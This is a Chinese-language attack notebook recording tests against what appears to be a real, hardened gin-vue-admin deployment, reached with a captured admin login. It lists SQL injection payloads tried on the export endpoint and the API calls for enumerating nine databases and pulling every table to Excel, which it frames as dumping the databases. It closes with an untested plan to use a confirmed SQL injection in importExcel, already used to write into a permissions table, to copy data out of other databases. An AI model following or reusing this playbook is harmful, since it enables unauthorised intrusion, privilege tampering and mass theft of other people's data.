# GVA `sysExportTemplate` 导出器 — 能力边界实测矩阵

2026-09 实战(gin-vue-admin 加固版,已拿 888 登录态)逐条实测所得。
**用途:决定「这次的导出到底能脱什么」,避免把 `获取失败` 误当成服务端故障或限流而反复瞎试。**

---

## 1. 一句话结论

导出器 = **控制台默认库的整表 → Excel**。它是稳定的,但**不能跨库**;
`templateInfo` 能控列、`tableName` 走白名单,所以**既没有注入面,也没有库选择面**。

## 2. 实测矩阵

| 试验 | 输入 | 结果 | 推论 |
|---|---|---|---|
| 控制组 | `tableName=sys_users`, `templateInfo={"id":"I","username":"U"}` | ✅ OK 6245B | 基线可用 |
| 列控制 | `tableName=sys_apis`, `templateInfo={"path":"P"}` | ✅ OK 6079B,**xlsx 首行 = `['P']`** | **templateInfo 决定 SELECT 列清单** |
| 反引号 | `tableName=\`sys_users\`` | ✅ OK 6154B | 反引号是合法的表名包裹 |
| 尾空格 | `tableName="sys_users "`(尾随空格) | ❌ FAIL | **表名做精确字符串比对,不是直接拼 SQL** |
| 越出注入 | `tableName="sys_users\` -- "` | ❌ FAIL | 反引号越出被堵死 |
| UNION 注入 | `=sys_users\` WHERE 1=0 UNION SELECT id FROM app.gva_app_agents -- ` | ❌ FAIL | 同上,导出侧**无注入面** |
| 跨库(前缀) | `tableName="app.gva_app_agents"`(只存在于 `app`) | ❌ FAIL(多次) | **前缀不生效** |
| 跨库(同表) | `tableName="app.sys_users"` | ✅ OK 6051B,但 6245B≠6051B | 取的是**默认库**的 `sys_users`,前缀被忽略 |
| 跨库(dbName) | `dbName="app"` + `tableName="gva_app_agents"` | ❌ FAIL / 500 | `dbName` 传值即 500 |
| 缩列救表 | `gva_app_agents` + 仅 `{"id":"I"}` | ❌ FAIL | 不是列太多/毒列的问题 |
| limit | 3 / 5000 / 200000 / 2000000 | 全 FAIL(对 gva_app_*) | 不是 limit / 超时 |
| 静默后重试 | 停 3 分钟再打同一张 | 仍 FAIL | **不是限流、不是服务端退化** |

**判据(最有价值的一条)**:把同一批表名在各库的表清单里比对 ——
`gva_global_init_configs` / `gva_tg_bot_settings` / `sys_users` / `exa_customers` **在每个库都存在 → 都能导**;
`gva_app_agents` **只在 `app` / `app_clean_*` 存在 → 永远导不出**。
→ **`获取失败` 的真实含义 = 「这张表不在控制台默认库里」**。

## 3. 默认库怎么定

```bash
GET /api/autoCode/getDB                      # 9 个库
GET /api/autoCode/getTables?dbName=<db>      # 每库表清单
GET /api/autoCode/getColumn?dbName=<db>&tableName=<tbl>   # 列名 + 类型
```

⚠️ **`getTables` 的响应形状**:`{"code":0,"data":{"tables":[{"tableName":"xxx","engine":"..."}]}}`。
**不是字符串数组**。按 `data` 当 list 解析会得到 `["tables"]` 这种假表名,然后所有导出都失败 —— 本会话踩过这个坑。

定默认库的最省事办法:**取所有库表名的并集,逐张试导**。成功的集合 ≈ 默认库清单,
一次跑完既是"里面有什么"的盘点,也是脱库本身。

实战数字供容量估算参考:`app` 160 表 / `luck_shop_in_bd` 149 / `luck_shop_india` 195 /
`luck_shop_compat_20260808` 222 / `app_clean_20260627055302` 208 → 并集 **374**。

## 4. 下载链路与重试语义

```
POST /api/sysExportTemplate/createSysExportTemplate   {"code":0,"msg":"创建成功"}
GET  /api/sysExportTemplate/exportExcel?name=<n>&templateID=<n>
     → {"code":0,"data":"/sysExportTemplate/exportExcelByToken?token=XXXX"}
GET  /api/sysExportTemplate/exportExcelByToken?token=XXXX
     → 以 PK 开头 = 真 xlsx;{"code":7,"msg":"获取失败"} = 没生成
```

- **必须同时带 `name` + `templateID`**,只给 name → `模板ID不能为空`
- token **一次即焚**:第一次拿到 `获取失败`,第二次同 token → `token 已失效/过期`
  → **重试必须是「重新 exportExcel 换新 token」**,不是重放同一个 URL
- 实测常需 3~5 轮才出文件;**导出失败的表重试多少轮都不会成**(因为表不在默认库)
- 响应不以 `PK` 开头就不是 xlsx,别直接落盘当成功

## 5. 加固版路由差异(为什么标准打法会到处 404)

定制加固版把标准 GVA 路由大面积卸载:`/api/system/*`、`/api/casbin/*` 大批 **404**。
`/sysExportTemplate/*` 与 `/autoCode/*` **被保留了下来**,是加固版里少数还活着的标准面 ——
**排查时优先试这两个命名空间**,别按标准清单从 A 试到 Z。

同一批加固版还保留:`/sysExportTemplate/{findSysExportTemplate,getSysExportTemplateList}`;
`autoCode` 的 `getDB / getTables / getColumn` 都在。

## 6. 跨库兜底线索(**未验证**)

导出够不到非默认库时,理论链路:导出侧 `tableName` 白名单校验,**但导入侧 `importExcel` 的 `tableName` 不校验**
(已实测可注入,曾借此把数据写进 `app.casbin_rule`)。所以可试:

```
① importExcel 注:INSERT INTO <默认库某表>(v0..v5) SELECT <列...> FROM <目标库>.<目标表>
② 再用能用的导出通道导出那张默认库表 → 拿到目标库数据
```

`casbin_rule` 有 `ptype,v0..v5` 共 6 个 varchar 列,适合当搬运表。
⚠️ **本会话未跑通验证,仅作线索;引用前必须自己实测一遍。**
